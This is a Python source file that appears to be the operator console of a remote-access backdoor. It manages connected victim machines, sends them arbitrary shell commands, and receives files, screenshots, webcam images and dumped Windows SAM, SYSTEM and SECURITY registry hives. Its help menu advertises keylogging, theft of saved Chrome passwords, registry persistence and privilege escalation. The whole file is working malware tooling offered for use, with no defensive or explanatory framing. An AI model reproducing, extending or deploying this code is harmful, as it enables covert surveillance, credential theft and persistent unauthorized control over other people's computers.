import json
import hashlib
import os
import socket
import ssl
import sys
import time
import threading

# Constants
SCREENSHOT_DIR = 'images/screenshots'
WEBCAM_DIR = './images/webcam'
IMAGE_CHUNK_SIZE = 10485760 #10MB
SCREENSHOT_TIMEOUT = 10 # seconds
WEBCAM_TIMEOUT = 10 # seconds

heartbeat_timeout = 10  # seconds

ENCODING = 'utf-8'

class Bot:
    botList = {}
    botCount = 0
    def __init__(self,target,ip):
        self.target = target
        self.ip = ip
        self.alias = "bot"
        self.id = Bot.botCount
        Bot.botList[self.id] = self
        Bot.botCount+=1
        self.heartbeat()

    def send_heartbeat(self):
        pass

    def heartbeat(self):
        t1 = threading.Thread(target=self.send_heartbeat)
        t1.start()
        return t1

    def bot_help_manual(self):
        print('''\n
        quit                                --> Quit Session With The Target
        clear                               --> Clear The Screen
        background / bg                     --> Send Session With Target To Background
        cd *Directory name*                 --> Changes Directory On Target System
        upload *file name*                  --> Upload File To The Target Machine From Working Dir 
        download *file name*                --> Download File From Target Machine
        get *url*                           --> Download File From Specified URL to Target ./
        keylog_start                        --> Start The Keylogger
        keylog_dump                         --> Print Keystrokes That The Target From taskmanager.txt
        keylog_stop                         --> Stop And Self Destruct Keylogger File
        screenshot                          --> Takes screenshot and sends to server ./images/screenshots/
        chrome_pass                         --> Retrieves browser saved Passwords
        webcam                              --> Takes image with webcam and sends to ./images/webcam/
        start *programName*                 --> Spawn Program Using backdoor e.g. 'start notepad'
        remove_backdoor                     --> Removes backdoor from target!!!
        
        ===Windows Only===
        persistence *RegName* *filename*    --> Create Persistence In Registry
                                                copies backdoor to ~/AppData/Roaming/filename
                                                example: persistence Backdoor windows32.exe
        check                               --> Check If Has Administrator Privileges
        privilege                           --> Attempt to escalate privileges


        \n''')
        
    def reliable_send(self, data):
        jsondata = json.dumps(data)
        while True:
            try:
                self.target.send(jsondata.encode(ENCODING))
                break
            except BrokenPipeError:
                break
            except Exception as e:
                print(f"An unexpected error occurred: {e}")
                break

    def reliable_recv(self):
        data = ''
        while True:
            try:
                data += self.target.recv(1024).decode(ENCODING).rstrip()
                return json.loads(data)
            except ValueError:
                continue
            except socket.error as e:
                print(f"Socket error: {e}")
                return None
            except Exception as e:
                print(f"Unexpected error: {e}")
                return None

    def upload_file(self, file_name):
        try:
            f = open(file_name, 'rb')
            data = f.read()
            f.close()
        except FileNotFoundError:
            print(f"The file {file_name} does not exist.")
            return
        except IOError as e:
            print(f"Error reading from {file_name}: {e}")
            return

        try:
            self.target.send(data)
        except socket.error as e:
            print(f"Error sending data: {e}")
            return

        print(f"File {file_name} uploaded successfully.")

    def download_file(self, file_name):
        try:
            f = open(file_name, 'wb')
        except IOError as e:
            print(f"Error opening file {file_name} for writing: {e}")
            return
        self.target.settimeout(2)
        chunk = None
        try:
            while True:
                try:
                    if chunk is not None:
                        f.write(chunk)
                    chunk = self.target.recv(1024)
                except socket.timeout:
                    break
        except socket.error as e:
            print(f"Error receiving data: {e}")
        finally:
            f.close()
        self.target.settimeout(None)
        print(f"File {file_name} downloaded successfully.")

        
    def screenshot(self, count):
        os.makedirs(SCREENSHOT_DIR, exist_ok=True)
        file_name = f'{SCREENSHOT_DIR}/screenshot_{count}.png'
        try:
            f = open(file_name, 'wb')
        except IOError as e:
            print(f"Error opening file {file_name} for writing: {e}")
            return count
        self.target.settimeout(SCREENSHOT_TIMEOUT)
        chunk = None
        try:
            while True:
                try:
                    if chunk is not None:
                        f.write(chunk)
                    chunk = self.target.recv(IMAGE_CHUNK_SIZE)
                except socket.timeout:
                    break
        except socket.error as e:
            print(f"Error receiving data: {e}")
        finally:
            f.close()
        self.target.settimeout(None)
        print(f"Screenshot saved to {file_name}")
        count += 1
        return count

    def webcam(self, count):
        os.makedirs(WEBCAM_DIR, exist_ok=True)
        file_name = f'{WEBCAM_DIR}/webcam_pic_{count}.jpg'
        try:
            f = open(file_name, 'wb')
        except IOError as e:
            print(f"Error opening file {file_name} for writing: {e}")
            return count
        self.target.settimeout(WEBCAM_TIMEOUT)
        chunk = None
        try:
            while True:
                try:
                    if chunk is not None:
                        f.write(chunk)
                    chunk = self.target.recv(IMAGE_CHUNK_SIZE)
                except socket.timeout:
                    break
        except socket.error as e:
            print(f"Error receiving data: {e}")
        finally:
            f.close()
        self.target.settimeout(None)
        print(f"Webcam image saved to {file_name}")
        return count + 1

    def handle_sam_dump(self):
        print("sam handle")
        sam_data, system_data, security_data = self.reliable_recv()
        if isinstance(sam_data, str):
            print(sam_data)
        else:  
            with open('SAM_dump', 'wb') as f:
                f.write(sam_data)
            with open('SYSTEM_dump', 'wb') as f:
                f.write(system_data)
            with open('SECURITY_dump', 'wb') as f:
                f.write(security_data)        

    def communication(self):
        screenshot_count = 0
        webcam_count = 0
        while True:
            command = input('* Shell~%s: ' % str(self.ip))
            if command == 'quit':
                self.reliable_send(command)
                break
            elif command == 'background' or command == 'bg':
                break
            elif command == 'clear':
                os.system('clear')
            elif command[:3] == 'cd ':
                self.reliable_send(command)
            elif command[:6] == 'upload':
                self.reliable_send(command)
                self.upload_file(command[7:])
            elif command[:8] == 'download':
                self.reliable_send(command)
                self.download_file(command[9:])
            elif command[:10] == 'screenshot':
                self.reliable_send(command)
                self.screenshot(screenshot_count)
                screenshot_count += 1
            elif command[:6] == 'webcam':
                self.reliable_send(command)
                self.webcam(webcam_count)
                webcam_count += 1
            elif command[:8] == 'sam_dump':
                self.reliable_send(command)
                self.handle_sam_dump()
            elif command[:11] == "chrome_pass":
                self.reliable_send(command)
                result = self.reliable_recv()
                print(result)
            elif command == 'help':
                self.bot_help_manual()
            else:
                self.reliable_send(command)
                result = self.reliable_recv()
                print(result)

    def kill(self):
        self.reliable_send('quit')
        self.target.close()
        del Bot.botList[self.id]